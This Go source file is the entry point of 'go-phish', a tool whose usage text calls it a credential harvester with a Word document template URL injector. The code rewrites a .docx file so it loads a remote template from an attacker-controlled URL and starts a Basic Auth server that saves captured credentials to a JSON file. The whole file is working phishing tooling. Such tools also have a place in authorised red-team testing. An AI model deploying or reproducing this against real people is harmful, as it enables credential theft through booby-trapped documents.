package main

import (
	"os"
	"os/signal"
	"syscall"
	"flag"
	"fmt"

	"github.com/ryhanson/go-phish/gp"
	"github.com/ryhanson/go-phish/badocx"
)

const usage =
`                              __    _      __
     ____ _____        ____  / /_  (_)____/ /_
    / __ \/ __ \______/ __ \/ __ \/ / ___/ __ \
   / /_/ / /_/ /_____/ /_/ / / / / (__  ) / / /
   \__, /\____/     / .___/_/ /_/_/____/_/ /_/
  /____/           /_/ 	An SSL Enabled Basic Auth Credential Harvester
			with a Word Document Template URL Injector

  Start the server  : go-phish -s settings.json -c credentials.json
  Inject a template : go-phish -u https://secure.site.local/docs -i good.docx -o bad.docx

  Options:
    -h, --help      Show usage and exit.
    -v              Show version and exit.
    -s              The JSON settings file used to setup the server. [default: "settings.json"]
    -c              The JSON file to store harvested credentials. [default: "credentials.json"]
    -u              The go-phish URL to use as the Word document template.
    -i              The Word .docx file to inject with a template URL.
    -o              The new Word .docx file with the injected template URL.
`

var np = gp.NeatPrint{}

func main() {
	var (
		flVersion	= flag.Bool("v", false, "")
		flSettings	= flag.String("s", "settings.json", "")
		flCredentials	= flag.String("c", "credentials.json", "")
		flUrl		= flag.String("u", "", "")
		flDocx		= flag.String("i", "", "")
		flBadocx	= flag.String("o", "", "")
	)
	flag.Usage = func() { fmt.Print(usage) }
	flag.Parse()

	if *flVersion {
		np.Info("go-phish version: " + gp.VERSION)
		os.Exit(0)
	}

	if *flDocx != "" || *flUrl != "" || *flBadocx != "" {
		createBadocx(*flUrl, *flDocx, *flBadocx)
	}

	c := make(chan os.Signal, 2)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func(){
		<-c
		fmt.Println()
		np.Event("Stopping auth server...")
		os.Exit(1)
	}()

	gp.StartNewServer(*flSettings, *flCredentials)
}

func createBadocx(url string, in string, out string) {
	if url == "" || in == "" || out == "" {
		np.Error("Word .docx files and URL are required!")
		np.Info("Usage: go-phish -u https://secure.site.local/docs -i good.docx -o bad.docx")
		os.Exit(0)
	}

	np.Event("Opening Word document: " + in)
	wordDocx, err := badocx.OpenDocx(in)
	if err != nil {
		np.Error("Error opening word document: " + err.Error())
		os.Exit(1)
	}

	np.Event("Setting Word document template to: " + url)
	wordDocx.SetTemplate(url)

	np.Event("Saving injected Word document to: " + out)
	wordDocx.WriteBadocx(out)

	wordDocx.Close()
	np.Info("Injected Word document has been saved!")

	os.Exit(0)
}